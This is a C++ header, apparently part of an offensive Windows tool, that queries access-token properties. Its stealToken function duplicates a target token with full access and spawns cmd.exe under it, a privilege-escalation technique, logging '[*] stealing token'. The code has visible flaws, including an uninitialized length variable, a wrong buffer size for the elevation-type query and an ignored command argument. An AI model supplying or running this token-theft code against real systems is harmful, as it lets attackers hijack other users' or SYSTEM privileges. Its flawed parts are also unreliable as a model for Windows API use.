#pragma once
#include <Windows.h>
#include <TlHelp32.h>
#include <string>

#pragma comment(lib, "advapi32.lib")

constexpr SIZE_T MAX_LEN = 256;

struct TUSER
{
	wchar_t lpDomain[MAX_LEN];
	wchar_t lpName[MAX_LEN];
};

struct TSTAT
{
	wchar_t tokenType[MAX_LEN];
	wchar_t impersonationLevel[MAX_LEN] = L"N/A";
};

struct TINTG
{
	wchar_t integrityLevel[MAX_LEN];
};

struct TELEV
{
	wchar_t isElevated[MAX_LEN];
	wchar_t elevationType[MAX_LEN];
};

TUSER getTokenUser(HANDLE hToken)
{
	DWORD returnLength = 0;
	GetTokenInformation(hToken, TokenUser, nullptr, 0, &returnLength);
	LPVOID lpTokenInfo = NULL;
	lpTokenInfo = LocalAlloc(LMEM_FIXED, returnLength);
	GetTokenInformation(hToken, TokenUser, lpTokenInfo, returnLength, &returnLength);
	DWORD dwSize = MAX_LEN;
	TUSER tuser = {};
	SID_NAME_USE sidType;
	LookupAccountSid(nullptr, ((TOKEN_USER*)lpTokenInfo)->User.Sid, tuser.lpName, &dwSize, tuser.lpDomain, &dwSize, &sidType);
	LocalFree((HLOCAL)lpTokenInfo);
	return tuser;
}

TSTAT getTokenStatistics(HANDLE hToken)
{
	DWORD returnLength = 0;

	GetTokenInformation(hToken, TokenStatistics, nullptr, returnLength, &returnLength);
	TOKEN_STATISTICS* lpTokenInfo = (TOKEN_STATISTICS*)LocalAlloc(LMEM_FIXED, returnLength);
	GetTokenInformation(hToken, TokenStatistics, lpTokenInfo, returnLength, &returnLength);
	TSTAT tstat = {};
	if (lpTokenInfo->TokenType == 1)
	{
		wcscpy(tstat.tokenType, L"TokenPrimary");
	}
	else
	{
		wcscpy(tstat.tokenType, L"TokenImpersonation");
	}
	
	if (lpTokenInfo->TokenType == 2)
	{ 
		switch (lpTokenInfo->ImpersonationLevel)
		{
		case 0:
			wcscpy(tstat.impersonationLevel, L"SecurityAnonymous");
			break;
		case 1:
			wcscpy(tstat.impersonationLevel, L"SecurityIdentification");
			break;
		case 2:
			wcscpy(tstat.impersonationLevel, L"SecurityImpersonation");
			break;
		case 3:
			wcscpy(tstat.impersonationLevel, L"SecurityDelegation");
			break;
		}
		
	}
	LocalFree((HLOCAL)lpTokenInfo);
	return tstat;
} 

TINTG getTokenIntegrityLevel(HANDLE hToken)
{
	DWORD returnLength = 0;

	GetTokenInformation(hToken, TokenIntegrityLevel, nullptr, returnLength, &returnLength);
	TOKEN_MANDATORY_LABEL* lpTokenInfo = (TOKEN_MANDATORY_LABEL*)LocalAlloc(LMEM_FIXED, returnLength);
	GetTokenInformation(hToken, TokenIntegrityLevel, lpTokenInfo, returnLength, &returnLength);

	PUCHAR lpCount = GetSidSubAuthorityCount(lpTokenInfo->Label.Sid);
	PDWORD lpSubAuthority = GetSidSubAuthority(lpTokenInfo->Label.Sid, *lpCount - 1);

	TINTG tintg = {};
	if (*lpSubAuthority >= SECURITY_MANDATORY_SYSTEM_RID)
	{
		wcscpy(tintg.integrityLevel, L"SYSTEM");
	}
	else if (*lpSubAuthority >= SECURITY_MANDATORY_HIGH_RID)
	{
		wcscpy(tintg.integrityLevel, L"HIGH");
	}
	else if (*lpSubAuthority >= SECURITY_MANDATORY_MEDIUM_RID)
	{
		wcscpy(tintg.integrityLevel, L"MEDIUM");
	}
	else if (*lpSubAuthority >= SECURITY_MANDATORY_LOW_RID)
	{
		wcscpy(tintg.integrityLevel, L"LOW");
	}
	else
	{
		wcscpy(tintg.integrityLevel, L"UNTRUSTED");
	}
	LocalFree((HLOCAL)lpTokenInfo);
	return tintg;
}

TELEV getTokenElevationType(HANDLE hToken)
{
	DWORD returnLength;

	GetTokenInformation(hToken, TokenElevation, nullptr, returnLength, &returnLength);
	TOKEN_ELEVATION* lpTokenInfo = (TOKEN_ELEVATION*)LocalAlloc(LMEM_FIXED, returnLength);
	GetTokenInformation(hToken, TokenElevation, lpTokenInfo, returnLength, &returnLength);

	TELEV telev = {};
	if (lpTokenInfo->TokenIsElevated == 0)
	{
		wcscpy(telev.isElevated, L"FALSE");
	}
	else
	{
		wcscpy(telev.isElevated, L"TRUE");
	}

	GetTokenInformation(hToken, TokenElevation, nullptr, returnLength, &returnLength);
	TOKEN_ELEVATION_TYPE* tet = (TOKEN_ELEVATION_TYPE*)LocalAlloc(LMEM_FIXED, returnLength);
	if (!GetTokenInformation(hToken, TokenElevationType, tet, returnLength, &returnLength))
	{
		printf("[-] error GetTokenInformation TOKEN_ELEVATION_TYPE: %d\n", GetLastError());
	}
	

	switch (*tet)
	{
	case TokenElevationTypeDefault:
		wcscpy(telev.elevationType, L"Default");
		break;
	case TokenElevationTypeFull:
		wcscpy(telev.elevationType, L"Full");
		break;
	case TokenElevationTypeLimited:
		wcscpy(telev.elevationType, L"Limited");
		break;
	}
	LocalFree((HLOCAL)lpTokenInfo);
	return telev;
}

void createProcessWithToken(HANDLE hToken, wchar_t cmd2[])
{
	LPSTARTUPINFOW sinfo = new STARTUPINFOW();
	sinfo->cb = sizeof(STARTUPINFOW);
	sinfo->dwFlags = STARTF_USESHOWWINDOW;
	sinfo->wShowWindow = 1;
	PPROCESS_INFORMATION pinfo = new PROCESS_INFORMATION();
	wchar_t cmd[] = L"C:\\Windows\\System32\\cmd.exe\0";
	if (!CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, cmd, NULL, NULL, NULL, sinfo, pinfo))
	{
		printf("[-] CreateProcessWithTokenW error: %d\n", GetLastError());
	}
	printf("[*] starting new process: %d\n", pinfo->dwProcessId);
}

void stealToken(HANDLE hToken, wchar_t cmd[])
{
	printf("[*] stealing token\n");
	HANDLE hTokenDup;
	if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenImpersonation, &hTokenDup))
	{
		SetThreadToken(nullptr, hTokenDup);
		createProcessWithToken(hTokenDup, cmd);
	}
	else
	{
		printf("[-] error DuplicateTokenEx: %d\n", GetLastError());
		exit(1);
	}
}

